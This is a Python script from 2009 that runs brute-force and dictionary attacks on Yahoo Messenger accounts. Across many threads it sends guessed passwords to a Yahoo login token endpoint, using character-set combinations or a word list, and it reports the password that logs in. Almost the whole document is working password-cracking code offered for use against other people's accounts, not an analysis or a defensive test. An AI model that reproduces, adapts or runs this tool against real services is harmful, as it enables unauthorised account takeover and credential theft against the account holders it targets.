#! /usr/bin/env python3.1
# 09.09.2009 <> 20.09.2009 | cmiN
# Yahoo Brute Force & Dictionary Attack (console)


import sys, threading, urllib.request


class YBFDA:
    
    def __init__(self, args):
        usage = """\t\t Yahoo Bf & Da 1.0

\t Usage: YahooBfDa.py ymsgrid mode [charset_mode string_range] [words_file] timeout

Where ymsgrid is the Yahoo ID
      mode is the attack mode:
          BF - Brute Force
          DA - Dictionary Attack
      charset_mode sets the characters to use:
          la - loweralpha
          ua - upperalpha
           d - digits
           o - others
      string_range is the length of the string from x to y:
          1 - min
          9 - max
      words_file is a text file containing the passwords
      timeout is a float (seconds)

* Note that arguments in brackets may be missing and:
      charset_mode + string_range are used with "BF" mode
      words_file is used  with "DA" mode

\t Example: YahooBfDa.py cmin764 BF lad 6-9 1
\t          YahooBfDa.py cmin764 DA C:\\list.txt 0.1"""
        if len(args) in range(5, 7):
            try:
                self.ymsgrid = args[1]
                self.mode = args[2]
                self.url = "https://login.yahoo.com/config/pwtoken_get?src=ymsgr&login=" + self.ymsgrid + "&passwd="
                self.outstr = None
                if self.mode == "BF":
                    self.charset = list()
                    self.strran = None
                    first, last = int(args[4].split("-")[0]), int(args[4].split("-")[1])
                    if first <= last:
                        self.strran = range(first, last + 1, 1)
                    else:
                        self.strran = range(first, last - 1, -1)
                    if "la" in args[3]:
                        self.charset.extend(['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'])
                    if "ua" in args[3]:
                        self.charset.extend(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
                    if "d" in args[3]:
                        self.charset.extend(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'])
                    if "o" in args[3]:
                        self.charset.extend(['`', '~', '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '|', '[', '{', ']', '}', ';', ':', "'", '"', ',', '<', '.', '>', '/', '?', ' '])
                    self.timeout = float(args[5])
                elif self.mode == "DA":
                    self.infile = args[3]
                    self.timeout = float(args[4])
                else:
                    raise Exception("invalid mode")
                self.start()
            except Exception as message:
                print("An error occurred: {}".format(message))
            except:
                print("Unknown error.")
        else:
            print(usage)
        input()  

    def start(self):
        MAX_THREADS = 50
        if self.mode == "BF":
            for strlen in self.strran:
                if strlen == 1:
                    generator = ("".join([word1]) for word1 in self.charset)
                elif strlen == 2:
                    generator = ("".join([word1, word2]) for word1 in self.charset for word2 in self.charset)
                elif strlen == 3:
                    generator = ("".join([word1, word2, word3]) for word1 in self.charset for word2 in self.charset for word3 in self.charset)
                elif strlen == 4:
                    generator = ("".join([word1, word2, word3, word4]) for word1 in self.charset for word2 in self.charset for word3 in self.charset for word4 in self.charset)
                elif strlen == 5:
                    generator = ("".join([word1, word2, word3, word4, word5]) for word1 in self.charset for word2 in self.charset for word3 in self.charset for word4 in self.charset for word5 in self.charset)
                elif strlen == 6:
                    generator = ("".join([word1, word2, word3, word4, word5, word6]) for word1 in self.charset for word2 in self.charset for word3 in self.charset for word4 in self.charset for word5 in self.charset for word6 in self.charset)
                elif strlen == 7:
                    generator = ("".join([word1, word2, word3, word4, word5, word6, word7]) for word1 in self.charset for word2 in self.charset for word3 in self.charset for word4 in self.charset for word5 in self.charset for word6 in self.charset for word7 in self.charset)
                elif strlen == 8:
                    generator = ("".join([word1, word2, word3, word4, word5, word6, word7, word8]) for word1 in self.charset for word2 in self.charset for word3 in self.charset for word4 in self.charset for word5 in self.charset for word6 in self.charset for word7 in self.charset for word8 in self.charset)
                elif strlen == 9:
                    generator = ("".join([word1, word2, word3, word4, word5, word6, word7, word8, word9]) for word1 in self.charset for word2 in self.charset for word3 in self.charset for word4 in self.charset for word5 in self.charset for word6 in self.charset for word7 in self.charset for word8 in self.charset for word9 in self.charset)
                for string in generator:
                    while threading.activeCount() > MAX_THREADS:
                        pass
                    Scan(self, string).start()
                    if not self.outstr is None:
                        break
                if not self.outstr is None:
                    break
        else:
            with open(self.infile, "r") as f:
                for string in f:
                    while threading.activeCount() > MAX_THREADS:
                        pass
                    Scan(self, string).start()
                    if not self.outstr is None:
                        break
        while threading.activeCount() > 1:
            pass
        if self.outstr is None:
            print("The program didn't find the password.")
        else:
            print("The program found the password: {}".format(self.outstr))


class Scan(threading.Thread):

    def __init__(self, app, string):
        threading.Thread.__init__(self)
        self.app = app
        self.string = string

    def run(self):
        try:
            with urllib.request.urlopen("".join([self.app.url, self.string.strip("\n")]), timeout=self.app.timeout) as u:
                x = int(str(u.read(1), encoding="utf-8"))
                if x == 0:
                    self.app.outstr = self.string.strip("\n")
        except:
            print("Timed out !")


if __name__ == "__main__":
    YBFDA(sys.argv)
